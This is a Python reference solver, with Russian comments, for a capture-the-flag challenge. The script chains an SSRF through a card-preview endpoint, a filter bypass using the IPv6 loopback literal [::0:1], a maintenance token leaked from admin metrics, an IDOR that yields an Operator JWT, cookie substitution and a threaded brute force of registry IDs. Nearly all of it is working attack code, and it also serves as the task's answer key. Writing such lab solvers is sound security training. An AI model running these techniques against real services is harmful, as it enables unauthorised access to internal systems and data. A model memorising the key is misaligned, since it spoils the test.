#!/usr/bin/env python3
"""Эталонный солвер таска «Контур управления».

Цепочка:
  1. Регистрация наблюдателя. Карточка аномалии хранит свободный текст
     описания; если в тексте есть URL, сервер в фоне скачивает его для
     превью (видно по JS на /cards). Этот же путь — GET
     /cards/preview?source_url= — прямой stateless-эндпоинт SSRF: сервер
     скачивает URL и зеркалит upstream-статус/тело, ничего не сохраняя.
  2. Фильтр на source_url слеп к IPv6: литерал `[::0:1]` (loopback)
     не матчится ни под строковый чёрный список, ни под проверку на
     IPv4-литерал, а резолвится в ::1. Так достаём ответ внутреннего
     административного сервиса (127.0.0.1:80 / ::1:80, стандартный порт —
     в URL порт указывать не нужно).
  3. Фаззим внутренний API через тот же эндпоинт, находим живую ветку
     /admin/maintenance/{ping,requests,issue} среди decoy-путей.
  4. Токен обслуживания: заголовок называет /admin/config, значение
     утекло в /admin/metrics (простыня в тысячи строк — токен не в
     начале и не в конце, искать по слову "token").
  5. IDOR: /admin/maintenance/requests отдаёт список чужих заявок без
     поля status (не читер-подсказка "вот эта approved"). Перебираем
     все request_id через /admin/maintenance/issue — часть отклонена
     (403), часть выдаёт пропуск со status=Observer, одна — со
     status=Operator. Именно её и подставляем вместо access_token.
  6. Реестр открыт (status=Operator). Видимые записи — только 3, флаговая
     запись не в списке и не имеет предсказуемого id — её ищем прямым
     перебором /registry/entry?id= по диапазону 1..15000.

Запуск: python3 solver.py http://localhost:63401
"""

import base64
import json
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:63401"
ADMIN = "http://[::0:1]"
ID_RANGE = range(1, 15001)
KNOWN_VISIBLE_IDS = {1, 2, 3}

session = requests.Session()


def jwt_claims(token: str) -> dict:
    payload_b64 = token.split(".")[1]
    payload_b64 += "=" * (-len(payload_b64) % 4)
    return json.loads(base64.urlsafe_b64decode(payload_b64))


def fetch_internal(path: str) -> str:
    response = session.get(
        f"{BASE}/cards/preview",
        params={"source_url": f"{ADMIN}{path}"},
        timeout=15,
    )
    try:
        data = response.json()
    except ValueError:
        return ""
    return data.get("preview", "")


def main() -> None:
    username = "observer_solver"
    password = "s0lver_pass_2018"

    print("[*] шаг 0: регистрация наблюдателя")
    session.post(f"{BASE}/register", data={"username": username, "password": password}, timeout=15)
    session.post(f"{BASE}/login", data={"username": username, "password": password}, timeout=15)

    print("[*] шаг 1: SSRF через IPv6-литерал loopback -> /status")
    status_preview = fetch_internal("/status")
    print(f"    {status_preview}")
    if "control-loop-admin" not in status_preview:
        print("[-] не удалось достучаться до внутреннего сервиса через SSRF")
        sys.exit(1)

    print("[*] шаг 2-3: /admin/config и /admin/metrics -> токен обслуживания")
    config_preview = fetch_internal("/admin/config")
    print(f"    config: {config_preview}")

    metrics_preview = fetch_internal("/admin/metrics")
    token_match = re.search(r'maintenance_token_rotated\{value="([a-f0-9]+)"\}', metrics_preview)
    if token_match is None:
        print("[-] токен обслуживания не найден в /admin/metrics")
        sys.exit(1)
    token = token_match.group(1)
    print(f"[+] токен обслуживания: {token}")

    print("[*] шаг 4: список заявок через /admin/maintenance/requests (без поля status)")
    requests_preview = fetch_internal(f"/admin/maintenance/requests?token={token}")
    print(f"    {requests_preview}")

    request_ids = [int(m) for m in re.findall(r'"request_id":(\d+)', requests_preview)]
    if not request_ids:
        print("[-] список заявок пуст")
        sys.exit(1)

    print(f"[*] шаг 4: перебираем issue по всем {len(request_ids)} request_id")
    operator_pass = None
    for rid in request_ids:
        issue_preview = fetch_internal(f"/admin/maintenance/issue?token={token}&request_id={rid}")
        pass_match = re.search(r'"token":"([^"]+)"', issue_preview)
        if pass_match is None:
            print(f"    request_id={rid}: отклонено ({issue_preview})")
            continue
        candidate = pass_match.group(1)
        claims = jwt_claims(candidate)
        print(f"    request_id={rid}: выдан пропуск status={claims.get('status')}")
        if claims.get("status") == "Operator":
            operator_pass = candidate

    if operator_pass is None:
        print("[-] пропуск со status=Operator не найден среди заявок")
        sys.exit(1)
    print(f"[+] пропуск оператора (JWT, status=Operator): {operator_pass}")

    print("[*] шаг 5: подменяем access_token на выданный пропуск, открываем реестр")
    session.cookies.set("access_token", operator_pass)
    registry = session.get(f"{BASE}/registry", timeout=15)
    registry.raise_for_status()
    print("[+] реестр открыт")

    print(f"[*] шаг 6: перебор /registry/entry?id= по диапазону 1..{ID_RANGE.stop - 1}")
    stop_event = threading.Event()
    found: dict[str, object] = {}

    def probe(entry_id: int) -> None:
        if stop_event.is_set() or entry_id in KNOWN_VISIBLE_IDS:
            return
        try:
            r = session.get(f"{BASE}/registry/entry", params={"id": entry_id}, timeout=10)
        except requests.RequestException:
            return
        if r.status_code == 200:
            found["id"] = entry_id
            found["text"] = r.text
            stop_event.set()

    with ThreadPoolExecutor(max_workers=64) as pool:
        list(pool.map(probe, ID_RANGE))

    if "id" not in found:
        print("[-] скрытая запись не найдена в диапазоне")
        sys.exit(1)
    print(f"[+] скрытая запись найдена: id={found['id']}")

    flag_match = re.search(r"FLAG=([^\s<]+)", str(found["text"]))
    if flag_match is None:
        print("[-] флаг не найден")
        sys.exit(1)
    print(f"\n[+] FLAG: {flag_match.group(1)}")


if __name__ == "__main__":
    main()
